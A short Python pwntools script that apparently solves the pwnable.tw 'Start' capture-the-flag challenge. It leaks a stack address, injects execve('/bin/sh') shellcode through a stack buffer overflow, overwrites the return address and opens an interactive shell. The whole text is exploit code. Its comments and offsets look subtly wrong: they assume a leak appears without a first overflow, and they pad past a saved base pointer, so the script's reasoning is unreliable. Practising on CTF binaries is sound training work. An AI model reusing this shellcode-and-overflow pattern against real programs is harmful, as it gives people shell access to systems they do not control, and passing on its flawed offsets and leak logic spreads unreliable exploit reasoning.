
from pwn import *

# Set up the target binary
binary_path = "./samples/PwnableTW/Start/start"
elf = ELF(binary_path)

# Start the process
p = process(binary_path)

# Receive the leaked stack address
# The sys_write at 0x804807f prints 20 bytes from esp.
# This esp points to the buffer where sys_read will write.
# The leaked address is the address of the buffer itself.
p.recvuntil(b"Start :")
leaked_stack_address = u32(p.recv(4))
log.info(f"Leaked stack address: {hex(leaked_stack_address)}")

# Craft shellcode for execve("/bin/sh", NULL, NULL)
# This is a standard 32-bit execve shellcode
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# Calculate padding
# The buffer is 20 bytes.
# The return address is typically 4 bytes after the buffer on a 32-bit system.
# So, 20 bytes for the buffer + 4 bytes for EBP (saved base pointer) = 24 bytes to reach the return address.
# We want to overwrite the return address with the address of our shellcode.
# The shellcode will be placed at the beginning of the buffer.
# So, the return address should point to the leaked_stack_address.
padding_size = 20 + 4 - len(shellcode) # 20 bytes for buffer, 4 for EBP, subtract shellcode length

# Construct the payload
# Shellcode + padding + return address (leaked_stack_address)
payload = shellcode + b"A" * padding_size + p32(leaked_stack_address)

log.info(f"Payload length: {len(payload)}")

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
